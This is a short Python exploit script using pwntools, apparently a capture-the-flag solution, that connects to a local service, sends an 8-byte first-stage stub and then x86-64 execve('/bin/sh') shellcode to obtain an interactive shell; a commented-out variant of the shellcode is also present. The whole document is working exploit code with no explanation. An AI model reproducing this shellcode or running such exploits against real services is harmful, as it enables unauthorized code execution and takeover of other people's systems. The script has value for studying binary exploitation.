from pwn import *
import time

#p = process('./binary')
p = remote('127.0.0.1', 33128)

p.recvuntil('be happy')
#p.interactive()
p.send("\x58\x80\xF2\xFA\x34\x77\xFF\xE0")
time.sleep(1)
#p.sendline("\x6A\x3B\x58\x68\x2F\x62\x69\x6E\x68\x2F\x73\x68\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05")
p.sendline("\x6A\x3B\x58\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05")
p.interactive()